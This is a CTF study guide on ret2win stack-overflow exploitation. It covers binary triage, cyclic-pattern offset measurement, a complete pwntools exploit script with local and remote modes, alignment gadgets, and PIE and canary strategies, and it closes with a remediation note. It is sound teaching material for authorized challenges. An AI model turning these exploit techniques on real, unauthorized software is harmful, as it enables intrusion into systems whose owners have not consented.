# Ret2win Guide

Use this guide for authorized CTF and lab binaries where a stack overflow can replace a saved return address and the program already contains a useful function such as `win`, `print_flag`, `get_flag`, or `shell`.

```text
controlled input -> saved return address -> win function
```

The solve comes down to proving three facts: input reaches the saved return address, its exact offset is known, and the destination is valid at runtime.

## 1. Fast Decision Tree

```text
Does long input crash the program?
├─ No  -> find the real input path, length limit, or another bug
└─ Yes -> does a cyclic pattern control the saved return address?
   ├─ No  -> inspect truncation, a canary, off-by-one, or the wrong crash value
   └─ Yes -> is there a useful in-binary function?
      ├─ No  -> move to ROP, ret2libc, or another primitive
      └─ Yes -> is its runtime address predictable?
         ├─ Yes -> call it directly
         └─ No  -> obtain a PIE leak or test an intended partial overwrite
```

## 2. Triage Before Exploiting

```bash
file ./vuln
checksec --file=./vuln
readelf -hW ./vuln
readelf -sW ./vuln | grep -Ei 'win|flag|shell|secret'
nm -an ./vuln | grep -Ei 'win|flag|shell|secret'
strings -a -n 5 ./vuln | grep -Ei 'flag|congrat|success|/bin/sh'
```

Record the architecture, endianness, canary, NX, PIE, RELRO, whether symbols are stripped, and how input is read.

| Mitigation | Ret2win consequence |
|---|---|
| NX enabled | Usually irrelevant: ret2win reuses executable code. |
| No canary | A contiguous overwrite to the saved return address is plausible. |
| Canary present | A normal overwrite aborts unless the canary is leaked, preserved, or avoided. |
| No PIE | Code symbols normally have fixed virtual addresses despite stack ASLR. |
| PIE enabled | The `win` offset is stable, but its runtime address needs a code leak or intended partial overwrite. |
| RELRO | Usually irrelevant because direct ret2win needs no GOT overwrite. |

> 💡 **What to watch out for:** `checksec` describes mitigations, not exploitability. Confirm the data flow and crash in a debugger.

## 3. Find the Vulnerable Input Path

In IDA or Ghidra, begin at `main` and follow attacker-controlled data. Look for:

- `gets`, `strcpy`, `strcat`, or `scanf("%s", ...)`
- `read`/`recv` with a size larger than the destination
- `fgets` with an incorrect length
- a local copy loop without a bounds check
- menu handlers that perform a second read

Determine the local buffer's position in the stack frame and whether the write continues through the saved frame pointer into the saved return address. Treat decompiler variable sizes as hypotheses; confirm them in assembly or GDB.

```bash
ltrace ./vuln
strace -e read,recvfrom ./vuln
gdb -q ./vuln
```

```gdb
set disassembly-flavor intel
disassemble main
info functions
break *main
run
```

## 4. Locate the Win Function

### Symbols are present

```bash
nm -an ./vuln | grep -Ei 'win|flag|shell|secret'
objdump -d -M intel ./vuln | grep -Ei '<(win|.*flag|.*shell)>'
```

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
log.info("win = %#x", exe.symbols["win"])
```

### Symbols are stripped

Search for behavior instead of names:

1. Find success strings, a flag filename, or `"/bin/sh"`.
2. Follow cross-references to functions using those strings.
3. Inspect calls to `system`, `execve`, `puts`, `printf`, `open`, or `fopen`.
4. Confirm the function entry in assembly, not a guessed decompiler line.
5. Rename it in IDA/Ghidra and record its image-relative offset.

```bash
strings -a -t x ./vuln | grep -Ei 'flag|success|/bin/sh'
objdump -d -M intel ./vuln
readelf -rW ./vuln
```

Never copy an address from another build. Validate the candidate in the current binary and under the debugger.

## 5. Measure the Exact Offset

Generate a cyclic pattern that fits within the input function's real read limit.

```bash
pwn cyclic 300 > pattern.txt
gdb -q ./vuln
```

```gdb
run < pattern.txt
info registers
x/8gx $rsp
x/8wx $esp
```

On amd64, the crash can occur at the vulnerable function's `ret`, leaving the overwritten return value at `$rsp`. Inspect the stack rather than assuming `$rip` contains the pattern.

```bash
pwn cyclic -l CRASH_VALUE
```

Local core-file automation:

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
io = process(exe.path)
io.sendline(cyclic(300, n=context.bytes))
io.wait()
core = io.corefile

if context.arch == "amd64":
    crash_value = core.read(core.rsp, context.bytes)
else:
    crash_value = pack(core.eip)

offset = cyclic_find(crash_value, n=context.bytes)
log.success("offset = %d", offset)
```

If core dumps are disabled, use GDB/GEF/Pwndbg and `cyclic_find` manually.

## 6. Prove Return-Address Control

Before calling `win`, replace the saved return address with a recognizable invalid marker and inspect the crash.

```python
from pwn import *

offset = 0  # replace after measuring
marker = 0x4242424242424242 if context.bits == 64 else 0x42424242
payload = flat({offset: marker})
```

This separates an offset problem from a target-address or calling-convention problem.

## 7. Minimal Pwntools Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
context.log_level = "info"

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript="""
            set disassembly-flavor intel
            continue
        """)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(exe.path)

offset = 0  # replace with the measured offset
payload = flat(b"A" * offset, exe.symbols["win"])

io = start()
io.sendline(payload)  # adapt to the actual input protocol
io.interactive()
```

```bash
python3 solve.py
python3 solve.py GDB
python3 solve.py REMOTE HOST=$TARGET PORT=$LPORT
```

## 8. amd64 Stack Alignment

The System V AMD64 ABI expects 16-byte stack alignment at call boundaries. Returning directly into `win` can shift the stack by eight bytes compared with a normal `call`. A later libc `movaps` instruction may fault even though the offset and target are correct.

Insert a plain `ret` gadget before `win`:

```python
rop = ROP(exe)
ret = rop.find_gadget(["ret"]).address

payload = flat(
    b"A" * offset,
    ret,
    exe.symbols["win"],
)
```

Diagnose first: if execution reaches `win` and then crashes inside libc, inspect the fault and `$rsp & 0xf` before changing the chain.

## 9. Win Functions with Arguments

On amd64 Linux, the first arguments normally use `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`. Let pwntools select gadgets where possible:

```python
rop = ROP(exe)
rop.call(exe.symbols["win"], [ARGUMENT_ONE, ARGUMENT_TWO])
payload = flat(b"A" * offset, rop.chain())
print(rop.dump())
```

Replace placeholders only with values recovered from the binary.

On i386 Linux, arguments normally follow the target and its return address on the stack:

```python
payload = flat(
    b"A" * offset,
    exe.symbols["win"],
    exe.symbols.get("main", 0),
    ARGUMENT_ONE,
    ARGUMENT_TWO,
)
```

Confirm the calling convention; ARM, MIPS, Windows x64, and unusual compiler attributes differ.

## 10. PIE Strategies

With PIE, `exe.symbols["win"]` is an offset until the runtime base is known.

1. Leak an address belonging to the main executable.
2. Identify its symbol or instruction precisely.
3. Calculate the image base.
4. Rebase pwntools and build the final payload.

```python
exe.address = leaked_code_address - exe.symbols["known_symbol"]
win = exe.symbols["win"]
```

An intended partial overwrite can work if only low address bytes must change while unchanged high bytes already point into the same PIE image. Verify the overwrite width, page alignment, ASLR variability, and input bad bytes locally; do not assume it is deterministic.

## 11. Canary Cases

If a canary separates the buffer from the saved return address, a direct overwrite normally triggers `__stack_chk_fail`. Possible intended branches are:

- leak the canary with a format string or over-read, then reproduce it exactly
- use an off-by-one or adjacent-pointer overwrite that avoids the canary
- exploit a different function compiled without stack protection
- redirect an indirect call before the protected function returns

Do not brute-force a canary unless the authorized challenge design and process model explicitly make it viable.

## 12. Input and Remote Reliability

The transport is part of the exploit. Verify:

- maximum `read`, `fgets`, or `scanf` length
- whether newline is included, stripped, or terminates input
- null, newline, space, or other bad-byte constraints
- whether the vulnerable read is the first or a later menu input
- whether the service forks, restarts, or closes after one attempt
- whether supplied remote binaries and libraries match local files

```python
io.send(payload)
io.sendline(payload)
io.sendafter(b"data: ", payload)
io.sendlineafter(b"choice: ", b"1")
```

## 13. Failure Matrix

| Symptom | Likely cause | Next check |
|---|---|---|
| No crash | Wrong input path or truncation | Trace reads and reproduce the menu sequence. |
| Canary failure | Payload crossed a protected frame | Find a leak, bypass, or different target. |
| Marker not used as return address | Wrong offset or cyclic width | Inspect `$rsp`/`$esp` and regenerate with matching `n`. |
| Jumps near but not to `win` | PIE/base or partial-overwrite error | Compare static offsets with runtime mappings. |
| Reaches `win`, then faults in libc | amd64 stack misalignment | Add one justified `ret` and recheck alignment. |
| Local works, remote fails | Protocol, binary, libc, or leak mismatch | Log received bytes and verify artifacts. |
| Function returns and crashes | No valid continuation | Add `main`, `exit`, or another safe destination. |
| Address is cut off | Input bad-byte constraint | Inspect the input API and raw payload bytes. |

## 14. Solve Checklist

- [ ] Confirm architecture and mitigations.
- [ ] Identify the vulnerable operation and true maximum input length.
- [ ] Locate and validate the useful function.
- [ ] Measure the saved-return-address offset with a cyclic pattern.
- [ ] Prove control with a marker.
- [ ] Account for PIE, canary, arguments, and stack alignment.
- [ ] Share one exploit script between local, GDB, and remote modes.
- [ ] Record the offset, base assumption, target address, and payload length.
- [ ] Re-run from a fresh process before considering the solve reliable.

## 15. Practice and References

- [ROP Emporium: ret2win](https://ropemporium.com/challenge/ret2win.html) — purpose-built exercises for x86_64, x86, ARMv5, and MIPS.
- [ROP Emporium Beginner's Guide](https://ropemporium.com/guide.html) — tool selection, input-length limits, alignment, and common ROP failures.
- [pwntools ROP documentation](https://docs.pwntools.com/en/stable/rop/rop.html) — generating and inspecting ROP chains.
- [pwntools core-file documentation](https://docs.pwntools.com/en/stable/elf/corefile.html) — cyclic crash analysis and offset recovery.
- [Simple Guide to Solving a CTF Ret2win Challenge with IDA](https://medium.com/@3381911964/simple-guide-to-solving-ctf-ret2win-challenge-with-ida-c1360bb48757) — the supplied IDA-oriented example.
- [Buffer Overflow Blueprint](../blueprints/Buffer%20Overflow%20Blueprint.md) — decision tree for ret2win, shellcode, ret2libc, and ROP.
- [GDB Cheat Sheet](../tools/GDB%20Cheat%20Sheet.md) and [REV Python Toolkit](../tools/REV%20Python%20Toolkit.md) — vault-local debugging and exploit scripting references.

> 🛡️ **Remediation Note:** Replace unsafe copies with destination-aware bounds, and enable stack protectors, PIE, ASLR, NX, full RELRO, and control-flow protections where available. Mitigations are defense in depth; correct bounds checking is the primary fix.
